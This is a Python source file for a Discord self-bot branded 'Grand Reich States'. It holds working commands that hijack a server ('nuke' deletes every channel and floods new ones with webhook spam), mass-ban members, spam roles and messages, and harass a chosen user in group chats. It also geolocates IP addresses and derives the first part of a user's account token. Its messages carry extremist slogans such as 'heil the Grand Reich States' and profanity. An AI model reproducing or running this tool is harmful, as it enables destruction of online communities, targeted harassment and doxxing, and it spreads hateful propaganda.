import sys
import os 
import subprocess
def install(package):
    cmd = [
        sys.executable, "-m", "pip", "install", "--break-system-packages",
        package
    ]

    if os.name == "posix":
        cmd.insert(0, "sudo")

    subprocess.check_call(cmd)


packages = {
    "discord.py==1.7.3": "discord",
    "aiohttp": "aiohttp",
    "colorama": "colorama",
    "requests": "requests",
    "random": "random",
    "threading": "threading",
    "re": "re",
    "base64": "base64",
    "DiscordWebhook": "DiscordWebhook",
    "discord_webhook": "discord_webhook",
}

for pkg, module in packages.items():
    try:
        __import__(module)
    except Exception:
        try:
            install(pkg)
        except Exception:
            continue
        try:
            __import__(module)
        except Exception:
            continue

import discord
from discord.ext import commands
import requests
import json
import os
import asyncio
import random
import aiohttp
import ipaddress
import colorama
import re
import socket
import discord
from colorama import Fore as C
from colorama import init
import base64 
from itertools import cycle
from datetime import timedelta, datetime
colorama.init(autoreset=True)

token = """insert token here"""
prefix = ">"
version = "1.2"
info = """made by enclave"""
init(autoreset=True)
colorama.init()
intents = discord.Intents.all()
grs = commands.Bot(command_prefix=prefix, self_bot=True, help_command=None, intents=intents)
autoreplies = {}
links = """
## > https://discord.gg/y4AXW43Kcx
## > https://t.me/GrandReichStates
## > https://www.youtube.com/@GrandReichStates
"""
nmsg = """
@everyone
```[ THIS SERVER HAS BEEN NUKED BY GRS - GRAND REICH STATES] [ YOU HAVE FALLEN TO THE WRATH OF THE GRS ]```
## > https://discord.gg/y4AXW43Kcx
## > https://t.me/GrandReichStates
"""
crds = (f"""
## > @enclaaave 
## > https://t.me/repent_to_him
## > https://www.youtube.com/@GrandReichStates
## > https://t.me/GrandReichStates
## > https://www.youtube.com/@enclaveballeditzz
## > https://discord.gg/y4AXW43Kcx""")
rname = """[ SERVER CONQUERED BY THE GRAND REICH STATES ]"""
rmsg = (f"""```[ THIS SERVER HAS BEEN RAIDED BY THE GRAND REICH STATES ]```
https://discord.gg/y4AXW43Kcx
https://youtube.com/@enclaveballeditzz
https://youtube.com/@GrandReichStates
https://tenor.com/view/marching-german-army-gif-21810011""")
msg1 = (f"""```CONQUERED BY THE GRAND REICH STATES``` https://discord.gg/y4AXW43Kcx""")
cmds = (f"""
{prefix}nuke
{prefix}spam for example {prefix} 100 (msg)
{prefix}invite (gives invite to the GRS server and telegram channel and gives link to the yt channel)
{prefix}rspam (spams roles)
{prefix}ipv4lookup for example {prefix}ipv4lookup (ipv4)
{prefix}whatismyip 
{prefix}userinfo for example {prefix}userinfo (user) and it gives basic info about the user and much more
{prefix}shutdown
{prefix}mb (massbans)
{prefix}credits
{prefix}changeprefix for example {prefix}setprefix (prefix)
{prefix}setpresence for example {prefix}setpresence (presence name)
{prefix}raid
{prefix}chatpack
{prefix}stopchatpack
{prefix}areply for example {prefix}areply (mention) (msg)
{prefix}areplyoff
{prefix}massping
{prefix}massping1 
{prefix}cspam for example cspam (amount) and it makes the amount of channels 
u want the self bot to spam
""")
art = (f"""
   ▄████  ██▀███   ▄▄▄      ███▄    █  ▓█████▄          ██▀███  ▓█████  ██ ▄████▄   ██░ ██       ██████ ▄▄▄█████▓ ▄▄▄     ▄▄▄█████▓▓█████  ██████ 
▒ ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ██ ▀█   █  ▒██▀ ██▌        ▓██ ▒ ██▒▓█   ▀▒▓██▒██▀ ▀█ ▒▓██░ ██     ▒██    ▒ ▓  ██▒ ▓▒▒████▄   ▓  ██▒ ▓▒▓█   ▀▒██    ▒ 
░▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄ ▓██  ▀█ ██▒ ░██   █▌        ▓██ ░▄█ ▒▒███  ░▒██▒▓█    ▄░▒██▀▀██     ░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄ ▒ ▓██░ ▒░▒███  ░ ▓██▄   
░░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██▓██▒  ▐▌██▒▒░▓█▄   ▌        ▒██▀▀█▄  ▒▓█  ▄ ░██▒▓▓▄ ▄██ ░▓█ ░██       ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄  ▒   ██▒
░▒▓███▀▒░░██▓ ▒██▒ ▓█   ▓██▒██░   ▓██░░░▒████▓         ░██▓ ▒██▒░▒████ ░██▒ ▓███▀  ░▓█▒░██▓    ▒██████▒▒  ▒██▒ ░  ▓█   ▓██  ▒██▒ ░ ░▒████▒██████▒▒
 ░▒   ▒  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒░   ▒ ▒ ░ ▒▒▓  ▒         ░ ▒▓ ░▒▓░░░ ▒░  ░▓ ░ ░▒ ▒    ▒ ░░▒░▒    ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█  ▒ ░░   ░░ ▒░ ▒ ▒▓▒ ▒ ░
  ░   ░    ░▒ ░ ▒░  ░   ▒▒ ░ ░░   ░ ▒░  ░ ▒  ▒           ░▒ ░ ▒░ ░ ░    ▒   ░  ▒    ▒ ░▒░ ░    ░ ░▒  ░      ░      ░   ▒▒     ░     ░ ░  ░ ░▒  ░  
░ ░   ░ ░   ░   ░   ░   ▒     ░   ░ ░   ░ ░  ░            ░   ░    ░    ▒ ░         ░  ░░ ░    ░  ░  ░    ░ ░      ░   ▒    ░ ░       ░  ░  ░  ░  
      ░     ░           ░           ░     ░               ░        ░    ░ ░ ░       ░  ░  ░          ░                 ░              ░        ░  
{C.GREEN}Version: {version} 
{C.GREEN}Prefix: {prefix}
{C.BLACK}{info}
{C.GREEN}{prefix}help for commands.
""")
menu1 = (f"""
```ansi
[1;30m 
 ▄████  ██▀███    ██████ 
 ██▒ ▀█▓██ ▒ ██▒▒██    ▒ 
▒██░▄▄▄▓██ ░▄█ ▒░ ▓██▄   
░▓█  ██▒██▀▀█▄    ▒   ██▒
▒▓███▀▒░██▓ ▒██▒▒██████▒▒
░▒   ▒ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░
 ░   ░   ░▒ ░ ▒ ░ ░▒  ░ ░
 ░   ░   ░░   ░ ░  ░  ░  
     ░    ░           ░  
[0m
────────────────────────────────────────────────────────────────────────
Version: {version}
Prefix: {prefix}
{info}
────────────────────────────────────────────────────────────────────────
prefix is changeable under line 63 just
edit the symbol to anything else that works with self bots
and boom or use the command "{prefix}changeprefix"
────────────────────────────────────────────────────────────────────────
Commands
────────────────────────────────────────────────────────────────────────
{prefix}nuke
{prefix}spam for example {prefix} 100 (msg)
{prefix}invite (gives invite to the GRS server and telegram channel and gives link to the yt channel)
{prefix}rspam (spams roles)
{prefix}ipv4lookup for example {prefix}ipv4lookup (ipv4)
{prefix}whatismyip 
{prefix}userinfo for example {prefix}userinfo (user) and it gives basic info about the user and much more
{prefix}shutdown
{prefix}mb (massbans)
{prefix}credits
{prefix}changeprefix for example {prefix}setprefix (prefix)
{prefix}setpresence for example {prefix}setpresence (presence name)
{prefix}raid
{prefix}chatpack
{prefix}stopchatpack
{prefix}autoreply for example {prefix }autoreply (mention) (msg)
{prefix}autoreplyoff 
{prefix}massping
{prefix}massping1 
{prefix}cspam for example cspam (amount) and it makes the amount of channels 
u want the self bot to spam
───────────────────────────────────────────────────────────────────────
```""")
def processtkn(token):
    response = requests.get('https://discord.com/api/v9/users/@me',
                            headers={'Authorization': token})
    if response.status_code == 200:
        user_data = response.json()
        user = user_data.get('username', 'N/A')
        return user
    else:
        return "cant fetch user data"
headers = {"Authorization": token}
user = processtkn(token)
prefixes = {}
def get_prefix(bot, message):
    return prefixes.get(message.guild.id, ">")
@grs.event
async def on_ready():
    print(f"{C.RED}{art}")
    print(f"{C.BLACK}logged in as {grs.user}")

@grs.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print(f"{C.RED}command invaild or typed wrong")

@grs.command()
async def help(ctx):
    await ctx.message.delete()
    await ctx.send(f"{menu1}")
    print(f"{cmds}")
@grs.command()
async def ipv4lookup(ctx, ip_address: str = None):
    await ctx.message.delete()

    if ip_address is None:
        print(f"no ipv4 provided")
        return

    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(ipv4_pattern, ip_address):
        print(f"invaild ipv4")
        return

    try:
        api_url = f'https://ipapi.co/{ip_address}/json/'
        response = requests.get(api_url, timeout=10)

        if response.status_code == 200:
            data = response.json()

            json_output = f"""```json
{{
  "ip": "{data.get('ip', 'N/A')}",
  "city": "{data.get('city', 'N/A')}",
  "region": "{data.get('region', 'N/A')}",
  "country": "{data.get('country_name', 'N/A')}",
  "country_code": "{data.get('country_code', 'N/A')}",
  "continent_code": "{data.get('continent_code', 'N/A')}",
  "postal": "{data.get('postal', 'N/A')}",
  "latitude": {data.get('latitude', 'N/A')},
  "longitude": {data.get('longitude', 'N/A')},
  "timezone": "{data.get('timezone', 'N/A')}",
  "utc_offset": "{data.get('utc_offset', 'N/A')}",
  "currency": "{data.get('currency', 'N/A')}",
  "languages": "{data.get('languages', 'N/A')}",
  "asn": "{data.get('asn', 'N/A')}",
  "org": "{data.get('org', 'N/A')}"
}}
```"""

            await ctx.send(json_output)
            print(f"ip looked up successfully")

        elif response.status_code == 429:
            print(f"{C.RED}Rate limited by IP API")
        else:
            print(
                f"failed to osint ip code: {response.status_code}"
            )

    except requests.RequestException as e:
        print(f"{e}")
    except Exception as e:
        print(f"{e}")
@grs.command()
async def whatismyip(ctx):
    await ctx.message.delete()
    ipv4 = requests.get("https://api.ipify.org").text
    print(f"{ipv4}")
@grs.command()
async def shutdown(ctx):
    await ctx.message.delete()
    print(f"{C.RED}shutting down")
    await grs.close()
@grs.command()
async def nuke(ctx):
    try:
        sn = "[ SERVER CONQUERED BY THE GRAND REICH STATES ]"
        await ctx.guild.edit(name=sn)
        print("server name fucked")
        coroutines = [channel.delete() for channel in ctx.guild.channels]
        await asyncio.gather(*coroutines)
        coroutines = [ctx.guild.create_text_channel("ᛝㆍᴄᴏɴǫᴜᴇʀᴇᴅ ʙʏ ɢʀꜱㆍᛝ") for _ in range(50)]
        await asyncio.gather(*coroutines)
    except:
        pass

async def webhook_spam(channel):
    try:
        webhook_names = ["[ FOR THE GRAND REICH STATES ]", "[ GRS HAS CAME FOR YOU ]"]
        webhook = await channel.create_webhook(name=random.choice(webhook_names))
        while True:
            await webhook.send(nmsg)
            await asyncio.sleep(0.0001)
    except Exception as e:
        print(f"webhook error: {e}")
@grs.event
async def on_guild_channel_create(channel):
    asyncio.create_task(webhook_spam(channel))
@grs.command()
async def cspam(ctx, amount: int):
    await ctx.message.delete()
    for _ in range(amount):
        await ctx.guild.create_text_channel(name=f"ᛝㆍᴄᴏɴǫᴜᴇʀᴇᴅ ʙʏ ɢʀꜱㆍᛝ")
        print("spamming channels")
        await asyncio.sleep(0.0001)
@grs.command()
async def mb(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban(reason="https://t.me/repent_to_him")
        except:
            pass
@grs.command()
async def invite(ctx):
    await ctx.message.delete()
    await ctx.send(f"{links}")
@grs.command()
async def credits(ctx):
    await ctx.message.delete()
    await ctx.send(f"{crds}")
@grs.command()
async def rspam(ctx):
    for i in range(1000):
        await ctx.guild.create_role(name=rname)
@grs.command()
async def userinfo(ctx, user: discord.User = None):
    await ctx.message.delete()

    if user is None:
        print(f"{C.RED}user not found or they blocked lol")
        return

    try:
        user_id = str(user.id)
        username = user.name
        discriminator = user.discriminator if user.discriminator != "0" else ""
        display_name = f"{username}#{discriminator}" if discriminator else username

        creation_timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
        creation_date = datetime.fromtimestamp(creation_timestamp).strftime(
            "%Y-%m-%d %H:%M:%S (UTC)"
        )

        avatar_url = str(user.avatar_url) if user.avatar else "No avatar"

        encoded_user_id = __import__('base64').b64encode(
            user_id.encode()).decode().rstrip("=")
        encoded_timestamp = __import__('base64').b64encode(
            str(creation_timestamp).encode()).decode().rstrip("=")[:7]

        user_info = f"""
```
<< User Information >>
Username: {display_name}
User ID: {user_id}
Creation Date: {creation_timestamp}
Avatar URL: {avatar_url}
Token Start: {encoded_user_id}
Token Half: {encoded_user_id}.{encoded_timestamp}
```
        """
        await ctx.send(user_info)
        print(f"{user_info}")

    except Exception as e:
        print(f"{e}")
@grs.command()
async def setpresence(ctx, *, presence_name: str):
    await ctx.message.delete()
    await grs.change_presence(activity=discord.Game(name=presence_name))
    print(f"{C.GREEN}presence set to {presence_name} successfully G")
@grs.command()
async def spam(ctx, amount: int, *, msg):
    await ctx.message.delete()
    tasks = []
    try:
        for _ in range(amount):
            tasks.append(ctx.send(msg))
        await asyncio.gather(*tasks)
        print(f"{amount} messages sent successfully G")
    except Exception as e:
        print(f"{C.RED}{e}")
@grs.command()
async def changeprefix(ctx, new_prefix: str):
    await ctx.message.delete()
    for guild in grs.guilds:
        prefixes[guild.id] = new_prefix
    with open("prefixes.json", "w") as f:
        json.dump(prefixes, f, indent=4)
    print(f"prefix successfully changed to {new_prefix} my G")
    
@grs.command()
async def raid(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        for _ in range(10000):
          await ctx.send(rmsg)
            
chatpack_gc_names = [
    "[ THE GRAND REICH STATES ON TOP ]", "[ TOTAL DEGENERACY DEATH ]",
    "[ CONQUERED BY THE GRAND REICH STATES ]", "[ LONG LIVE THE GRAND REICH STATES]",
    "[ REPENT TO THE GRAND REICH STATES ]"
]
chatpack_messages = [
    "```[ FUCKED BY THE GRAND REICH STATES ]``` https://discord.gg/y4AXW43Kcx",
    "```[ GLORY TO THE GRAND REICH STATES ]``` https://discord.gg/y4AXW43Kcx",
    "```[ SURRENDER TO THE GRAND REICH STATES ]``` https://discord.gg/y4AXW43Kcx",
    "```[ THE GRAND REICH STATES IS COMING FOR YOU ]``` https://discord.gg/y4AXW43Kcx",
    "```[ BOW DOWN TO THE GRAND REICH STATES ]``` https://discord.gg/y4AXW43Kcx",
    "```[ CRUCIFIED BY THE GRAND REICH STATES ]``` https://discord.gg/y4AXW43Kcx",
    "```[ HEIL THE GRAND REICH STATES ]``` https://discord.gg/y4AXW43Kcx"
]
chatpack_blank_lines = "\n" * 500

chatpack_active = {}


@grs.command()
async def chatpack(ctx, target_user: discord.User = None):
    await ctx.message.delete()

    if not isinstance(ctx.channel, discord.GroupChannel):
        print(f"{C.RED} gc only")
        return

    if target_user is None:
        recipients = ctx.channel.recipients
        if not recipients:
            print(f"{C.RED} no one is in this gc")
            return
        target_user = recipients[0]

    channel_id = ctx.channel.id

    if channel_id in chatpack_active:
        print(f"{C.GREEN} chatpacker already running")
        return

    chatpack_active[channel_id] = True
    print(
        f"{C.BLACK} chatpacker started use {prefix}stopchatpack to stop it lol"
    )

    count = 1
    name_index = 0
    consecutive_failures = 0

    try:
        while chatpack_active.get(channel_id, False):
            if consecutive_failures >= 10:
                print("too many failures shutting down chatpacker")
                break

            base_name = chatpack_gc_names[name_index % len(chatpack_gc_names)]
            new_name = base_name + " " + str(count)
            try:
                await ctx.channel.edit(name=new_name)
                print(f"renamed gc to {new_name}")
            except Exception as e:
                print(f"failed to rename gc {e}")

            message = random.choice(chatpack_messages)
            msg = "." + chatpack_blank_lines + "\n." + "\n<@" + str(
                target_user.id) + "> " + message

            message_sent = False
            for retry_attempt in range(3):
                try:
                    await ctx.channel.send(msg)
                    print(f"[+] Sent ping to {target_user.name}")
                    message_sent = True
                    consecutive_failures = 0
                    break
                except discord.HTTPException as e:
                    if e.status == 429:
                        print(
                            f"taking small break g we got rate limited (attempt {retry_attempt + 1})"
                        )
                        await asyncio.sleep(0.01 * (retry_attempt + 1))
                    else:
                        print(
                            f"{e}"
                        )
                        await asyncio.sleep(0.01)
                except Exception as e:
                    print(
                        f"error: {e} attempt: {retry_attempt + 1})"
                    )
                    await asyncio.sleep(0.01)

            if not message_sent:
                consecutive_failures += 1
                print(
                    f"{C.RED}shutting down 3 failed retry attempts"
                )

            name_index += 1
            count += 1

            base_delay = 0.1
            if consecutive_failures > 0:
                delay = base_delay + (consecutive_failures * 0.5)
                await asyncio.sleep(min(delay, 0.5))
            else:
                await asyncio.sleep(base_delay)

    except Exception as e:
        print(f"{e}")
    finally:
        if channel_id in chatpack_active:
            del chatpack_active[channel_id]
        print("chatpacker stopped")


@grs.command()
async def stopchatpack(ctx):
    try:
        await ctx.message.delete()
    except Exception as e:
        print(f"{C.RED}{e}")

    channel_id = ctx.channel.id

    if channel_id in chatpack_active:
        del chatpack_active[channel_id]
        print(f"{C.RED}chatpacker stopped")
    else:
        print(f"{C.RED}chatpacker was never running")



@grs.command()
async def areply(ctx, user: discord.User, *, msg: str):
    autoreplies[user.id] = msg
    await ctx.send(msg)
    print(f"{C.GREEN}done")

@grs.command()
async def areplyoff(ctx):
    autoreplies.clear()
    print(f"{C.GREEN}done")
@grs.command()
async def massping(ctx, *, msg: str):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await ctx.send(f"{msg1} <@{member.id}>")
        except:
            pass
@grs.command()
async def massping1(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        for _ in range(10000):
          await ctx.send(f"{msg1} @everyone")

try:
    grs.run(token, bot=False)
except discord.LoginFailure:
    print(f"{C.RED}invalid token")
